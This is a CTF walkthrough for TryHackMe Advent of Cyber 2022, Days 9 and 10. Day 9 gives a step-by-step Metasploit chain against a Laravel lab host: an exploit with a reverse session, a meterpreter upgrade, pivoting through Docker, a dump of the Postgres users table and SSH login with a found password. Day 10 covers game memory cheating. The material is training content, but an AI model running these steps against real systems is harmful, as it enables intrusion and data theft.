# [Advent of Cyber 2022](https://tryhackme.com/room/adventofcyber4)

> Get started with Cyber Security in 24 Days - learn the basics by doing a new, beginner-friendly security challenge every day leading up to Christmas.

## Day 9: Dock the halls

scan the target

```
nmap -sV 10.10.249.228
```

![image](https://user-images.githubusercontent.com/90561566/206836994-a0fb95a9-acae-4ccf-ba35-ca6528a21ab3.png)

go to webpage, you will see it use Laravel framework

![image](https://user-images.githubusercontent.com/90561566/206840506-be217bdf-43cf-476f-9374-f90124b29f70.png)

search for exploit

![image](https://user-images.githubusercontent.com/90561566/206840698-57f8cc20-b922-498f-ba11-b61d7d792e8f.png)

```
msfconsole
```

![image](https://user-images.githubusercontent.com/90561566/206837648-bd28931c-0d84-4f9f-ade3-97692ff1269f.png)

type `info` and you will see cve here

![image](https://user-images.githubusercontent.com/90561566/206840790-4eede273-2564-40a2-b259-e541c3b1e38b.png)

```
set HttpClientTimeout 20
set rhosts 10.10.249.228
check
```

![image](https://user-images.githubusercontent.com/90561566/206837806-531454b0-ff76-47ea-80b5-e149fa8df684.png)

```
set lhost 10.8.0.74
run
```

![image](https://user-images.githubusercontent.com/90561566/206837939-35b425b2-0568-4b05-890b-43a01299d78d.png)

background the session

![image](https://user-images.githubusercontent.com/90561566/206837988-e6642782-7f7e-4a54-afa4-acd1c59a11b0.png)

update to meterpreter

```
sessions -u 1
sessions -i 2
```

![image](https://user-images.githubusercontent.com/90561566/206838093-8285c2ce-5860-45f9-9d5e-2c69a4c5bc90.png)

explore the application

![image](https://user-images.githubusercontent.com/90561566/206838159-9969a7e2-cdce-4ce3-a8dc-0d9f3081e70d.png)

![image](https://user-images.githubusercontent.com/90561566/206838186-643b9f42-691c-4d12-bfd1-5d21bff1b288.png)

resolve hostname to ip

```
resolve webservice_database
```

background session and config route table for pivoting

```
route add 172.28.101.51/32 2
```

![image](https://user-images.githubusercontent.com/90561566/206838345-54f3e8f8-8a20-4a40-b71b-2ac102b34280.png)

We can also see, due to the presence of the /.dockerenv file, that we are in a docker container. 

By default, Docker chooses a hard-coded IP to represent the host machine.

```
route add 172.17.0.1/32 2
```

dump the database schema

```
use auxiliary/scanner/postgres/postgres_schemadump
set rhosts 172.28.101.51
run
```

![image](https://user-images.githubusercontent.com/90561566/206839175-3d006527-4439-4a7f-8e43-9960f6d6fa9e.png)

```
use auxiliary/admin/postgres/postgres_sql
set rhosts 172.28.101.51
set database postgres
set sql 'select * from users'
run
```

![image](https://user-images.githubusercontent.com/90561566/206839428-c7603330-bbd1-4d31-82b7-c2bc8c8a269c.png)

create socks proxy

```
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 9050
set version 4a
run
```

![image](https://user-images.githubusercontent.com/90561566/206839549-64059aea-be38-444c-ab6f-f9da523b2996.png)

now you can use proxy through

```
proxychains nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
```

![image](https://user-images.githubusercontent.com/90561566/206839554-7ee40680-c4dd-49d0-8de1-8431fa20d1d6.png)

SSH into the host machine from the Docker container

```
use auxiliary/scanner/ssh/ssh_login
set username santa
set password p4$$w0rd
set rhosts 172.17.0.1
run
```

now interact with opened session to grab flag

![image](https://user-images.githubusercontent.com/90561566/206840056-96f5cd4d-5e12-43f3-a8bf-6053b31c7752.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/206840820-1d4b507f-fefa-495d-ae4e-c37dc1053558.png)

![image](https://user-images.githubusercontent.com/90561566/206840829-9634a7c4-c544-4e1a-a526-92f18f2fd401.png)

## Day 10: You're a mean one, Mr. Yeti

open a game at https://10.10.12.38:443

![image](https://user-images.githubusercontent.com/90561566/206893338-e7e236eb-3d73-435e-993b-f95b2634a6b2.png)

turn right and meet the guard near the door, he requires you to quess a number

![image](https://user-images.githubusercontent.com/90561566/206893407-23ead003-1731-4b1c-b031-872dcae0d8c2.png)

enter anything you want, he will show his first number, use it on cetus

![image](https://user-images.githubusercontent.com/90561566/206893584-93ff3eac-7c4a-48b7-9480-d2d79b2d9fe9.png)

bookmark it, talk to the guard again and answer with the new number (convert it to decimal before)

![image](https://user-images.githubusercontent.com/90561566/206893681-915060f7-42c6-4c56-8749-3006b08699b5.png)

you can change it to other number before answering (0 for easiest)

![image](https://user-images.githubusercontent.com/90561566/206894039-2dba8e8e-3983-40f3-9c47-97e70aea0003.png)

go ahead, it's a big challenge for you

![image](https://user-images.githubusercontent.com/90561566/206893782-02e62d34-75ae-4c25-a146-4faa13afdf7b.png)

hmm, you can't pass it, i think 2 ways to do that, once you can stop the snowball, or you need to be invincible

![image](https://user-images.githubusercontent.com/90561566/206894233-165ac268-b31a-4440-a572-6a1bbc55e96a.png)

start new search with no-value EQ flag, reduce your heart with 1 hit, then continue check with no-value LE flag

![image](https://user-images.githubusercontent.com/90561566/206894317-22fba31e-af43-4428-ae53-d392d7ffc335.png)

until you revive, check with GT flag, now you know your max heart EQ to 100

![image](https://user-images.githubusercontent.com/90561566/206894352-ef3c6996-7b89-442c-a8b5-a286a40e3872.png)

continue you will find out 3 record, the 2 same are correct, bookmark them

![image](https://user-images.githubusercontent.com/90561566/206894186-16d28a8a-ab35-42a7-bea7-1464f5eac0f3.png)

after testing with reducing my heart, i know the first one store current heart, the other store displayed heart

![image](https://user-images.githubusercontent.com/90561566/206894472-0ad70b6e-f9bd-4da5-9eea-9059a86c301b.png)

in other words, variable 2 is a reference to variable 1, but you can change both to 1000 or freeze the first var

![image](https://user-images.githubusercontent.com/90561566/206894629-7a3f5092-a608-4c2c-b13b-bc8e16730f9d.png)

talk to yeti, here is your flag

![image](https://user-images.githubusercontent.com/90561566/206894661-766054f4-119b-451d-b231-665e0554ee65.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/206894791-261f36a0-8fff-4bc9-89d5-0efd6d8d1c5d.png)

## Day 11: 











